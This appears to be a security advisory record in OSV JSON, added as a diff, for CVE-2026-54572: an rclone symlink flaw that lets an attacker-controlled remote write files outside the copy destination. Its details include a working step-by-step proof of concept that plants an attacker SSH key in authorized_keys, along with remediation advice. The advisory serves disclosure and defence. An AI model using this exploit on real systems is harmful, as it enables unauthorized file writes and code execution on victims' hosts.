@@ -1,0 +1,209 @@
+{
+  "schema_version": "1.8.0",
+  "id": "DHI-tidz-ftbi-jkev-qitb",
+  "modified": "2026-11-12T04:38:49Z",
+  "published": "2026-11-12T04:38:49Z",
+  "upstream": [
+    "CVE-2026-54572"
+  ],
+  "summary": "### Summary",
+  "details": "### Summary\nWith `-l/--links`, rclone serializes symlinks as `<name>.rclonelink` text objects whose body is the link target. When rclone writes such an object to a local destination, it recreates the symlink with `os.Symlink(<object body>, <dest path>)` and performs NO validation of the target. If the source is attacker-controlled, the attacker sets the body to any absolute or `../` path, so rclone plants a symlink inside the destination that points anywhere on the victim's filesystem. Because a sibling object named `<name>.rclonelink` sorts before `<name>/...`, rclone creates the escaping symlink first and then writes a following object \"inside\" it; `mkdirAll`/`OpenFile` follow the planted symlink, so the file lands OUTSIDE the destination with attacker-chosen contents. This yields arbitrary file write as the victim user, e.g. overwriting `~/.ssh/authorized_keys`, `~/.bashrc`, or a crontab — i.e. code execution.\n\n### Details\n`backend/local/local.go`, `Object.Update()`:\n```go\n} else {\n    out = nopWriterCloser{&symlinkData}          // body of <name>.rclonelink = attacker data\n}\n...\nif o.translatedLink {\n    if err == nil {\n        if _, err := os.Lstat(o.path); err == nil {\n            os.Remove(o.path)\n        }\n        // Use the contents for the copied object to create a symlink\n        err = os.Symlink(symlinkData.String(), o.path)   // <-- target NEVER validated (abs / .. allowed)\n    }\n}\n```\n`symlinkData` is the raw body of the source object, fully attacker-controlled when copying from an untrusted remote. There is no check that the target is relative or stays within the destination. The subsequent write path (`mkdirAll()` → `file.MkdirAll`, then `file.OpenFile(..., O_CREATE)`) follows existing symlink components with no `O_NOFOLLOW`, so a file written under the planted symlinked directory escapes the destination.\n\n### PoC\n1) Get the official stable binary:\n```\ncurl -fsSLO https://downloads.rclone.org/v1.74.3/rclone-v1.74.3-linux-amd64.zip\nunzip -j rclone-v1.74.3-linux-amd64.zip '*/rclone' -d .      # ./rclone -> v1.74.3\n```\n2) Create an attacker-controlled \"remote\" (two objects) and a victim layout:\n```\nmkdir -p evil/pwn dest victimhome/.ssh\nprintf '%s' \"$PWD/victimhome/.ssh\" > evil/pwn.rclonelink              # body = abs path OUTSIDE dest\nprintf 'ssh-ed25519 AAAA_ATTACKER_KEY pwned\\n' > evil/pwn/authorized_keys\nls -l victimhome/.ssh                                                 # empty (before)\n```\n3) Serve the malicious remote (models any untrusted remote — bucket / WebDAV / HTTP share):\n```\ncd evil && python3 -m http.server 38080 --bind 127.0.0.1\n```\n4) VICTIM ACTION — back up the untrusted remote preserving symlinks:\n```\n./rclone copy --links --http-url http://127.0.0.1:38080 :http: ./dest -v\n```\n5) Observe — a file landed OUTSIDE `./dest`:\n```\nls -l dest/pwn                       # dest/pwn -> .../victimhome/.ssh   (symlink escapes dest)\ncat victimhome/.ssh/authorized_keys  # ssh-ed25519 AAAA_ATTACKER_KEY pwned   <-- written outside dest\n```\n`pwn.rclonelink` sorts before `pwn/authorized_keys`, so rclone creates the escaping symlink first and the next write follows it out of the destination. With rclone run as the victim user this overwrites `~/.ssh/authorized_keys`, `~/.bashrc`, or a crontab → code execution.\n\n### Impact\nAn attacker who controls the contents of any remote a victim syncs with `-l/--links` gains arbitrary file write as the victim user, anywhere that user can write. Overwriting `~/.ssh/authorized_keys`, shell rc files, or cron files yields remote code execution on the victim's host. Even without the write-through step, the destination is silently populated with symlinks pointing anywhere on the local filesystem (confinement break / later read-or-write traversal).\n\n### Remediation\nIn `Object.Update()` reject symlink targets that are absolute or escape the destination root before calling `os.Symlink` (resolve `filepath.Join(dir, target)` and require it to stay within the configured root, or refuse absolute/`..` targets), and write objects with `O_NOFOLLOW` on the final component plus a no-symlink-in-parent check so a planted symlinked directory is never followed. Add a regression test copying a `.rclonelink` with target `/tmp/...` and a sibling file, asserting nothing is written outside the destination.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:H/A:L"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "telegraf-dev",
+        "purl": "pkg:apk/dhi/telegraf-dev"
+      },
+      "versions": [
+        "1.39.1-r0",
+        "1.39.2-r0",
+        "1.39.3-r0",
+        "1.39.3-r1",
+        "1.39.3-r2",
+        "1.39.3-r3",
+        "1.39.3-r4",
+        "1.39.3-r5",
+        "1.39.3-r6",
+        "1.40.0-r0",
+        "1.40.0-r1",
+        "1.40.1-r0",
+        "1.40.1-r1",
+        "1.40.1-r2",
+        "1.40.2-r0",
+        "1.40.2-r1",
+        "1.40.2-r2",
+        "1.40.2-r3",
+        "1.40.3-r0",
+        "1.40.3-r1"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "telegraf-fips-dev",
+        "purl": "pkg:apk/dhi/telegraf-fips-dev"
+      },
+      "versions": [
+        "1.39.1-r0",
+        "1.39.2-r0",
+        "1.39.3-r0",
+        "1.39.3-r1",
+        "1.39.3-r2",
+        "1.39.3-r3",
+        "1.39.3-r4",
+        "1.39.3-r5",
+        "1.39.3-r6",
+        "1.40.0-r0",
+        "1.40.0-r1",
+        "1.40.1-r0",
+        "1.40.1-r1",
+        "1.40.1-r2",
+        "1.40.2-r0",
+        "1.40.2-r1",
+        "1.40.2-r2",
+        "1.40.2-r3",
+        "1.40.3-r0",
+        "1.40.3-r1"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "telegraf-fips",
+        "purl": "pkg:apk/dhi/telegraf-fips"
+      },
+      "versions": [
+        "1.39.1-r0",
+        "1.39.2-r0",
+        "1.39.3-r0",
+        "1.39.3-r1",
+        "1.39.3-r2",
+        "1.39.3-r3",
+        "1.39.3-r4",
+        "1.39.3-r5",
+        "1.39.3-r6",
+        "1.40.0-r0",
+        "1.40.0-r1",
+        "1.40.1-r0",
+        "1.40.1-r1",
+        "1.40.1-r2",
+        "1.40.2-r0",
+        "1.40.2-r1",
+        "1.40.2-r2",
+        "1.40.2-r3",
+        "1.40.3-r0",
+        "1.40.3-r1"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "telegraf",
+        "purl": "pkg:apk/dhi/telegraf"
+      },
+      "versions": [
+        "1.39.1-r0",
+        "1.39.2-r0",
+        "1.39.3-r0",
+        "1.39.3-r1",
+        "1.39.3-r2",
+        "1.39.3-r3",
+        "1.39.3-r4",
+        "1.39.3-r5",
+        "1.39.3-r6",
+        "1.40.0-r0",
+        "1.40.0-r1",
+        "1.40.1-r0",
+        "1.40.1-r1",
+        "1.40.1-r2",
+        "1.40.2-r0",
+        "1.40.2-r1",
+        "1.40.2-r2",
+        "1.40.2-r3",
+        "1.40.3-r0",
+        "1.40.3-r1"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://scout.docker.com/v/DHI-tidz-ftbi-jkev-qitb"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-cf44-9pgv-m4xc"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-54572"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/rclone/rclone/security/advisories/GHSA-cf44-9pgv-m4xc"
+    },
+    {
+      "type": "FIX",
+      "url": "https://github.com/rclone/rclone/commit/874a804f5289517defdd7de68b2a374837080265"
+    },
+    {
+      "type": "FIX",
+      "url": "https://github.com/rclone/rclone/commit/1154afebee986180b489084d38e2a0c578751498"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/rclone/rclone/releases/tag/v1.74.4"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://alas.aws.amazon.com/AL2/ALAS-2026-3834.html"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-59733"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54572"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://alas.aws.amazon.com/AL2023/ALAS-2026-2002.html"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://security-tracker.debian.org/tracker/CVE-2026-54572"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://pkg.go.dev/vuln/GO-2026-6191"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://ubuntu.com/security/CVE-2026-54572"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "http://people.ubuntu.com/~ubuntu-security/cve/CVE-2026-54572"
+    }
+  ]
+}
